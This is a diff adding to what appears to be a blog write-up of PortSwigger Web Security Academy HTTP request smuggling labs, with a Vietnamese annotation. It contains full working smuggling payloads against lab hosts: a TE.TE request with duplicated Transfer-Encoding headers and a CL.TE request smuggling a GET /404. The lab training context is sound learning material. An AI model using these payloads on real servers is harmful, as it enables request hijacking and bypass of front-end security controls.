@@ -81,5 +81,72 @@ To solve the lab, smuggle a request to the back-end server, so that the next req
 ```
 
 * Exploit:
+```
+POST / HTTP/1.1
+Host: 0a8f00030302867584f35f9500110006.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2
+Transfer-Encoding: chunked
+Transfer-Encoding: cow
 
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+
+x=1
+0
+
+
+
+```
+<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ce94f9e0-f028-48cf-b177-05f0fad27c25">
+
+<img width="621" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/46cb025c-799e-468e-a2b6-8888cf946704">
+
+***
+
+## 4. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+
+* Content:
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
+```
+
+* Exploit:
+
+Lưu ý của bài này là biết cách sử dụng đúng của `Transfer-Encoding: chunk`. e=14 character => độ dài của `q=smuggling123` là 14.
+
+```
+POST / HTTP/1.1
+Host: 0acc008a03189284827d56400078008f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+Transfer-Encoding: chunked
+
+e
+q=smuggling123
+0
+
+GET /404 HTTP/1.1
+x: x
+```
+
+<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/de9271cf-b836-49b7-b6b5-bdb71e2b3613">
+
+<img width="602" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/40fdc7bd-3f12-465f-b85c-d8cbe831ec94">
 
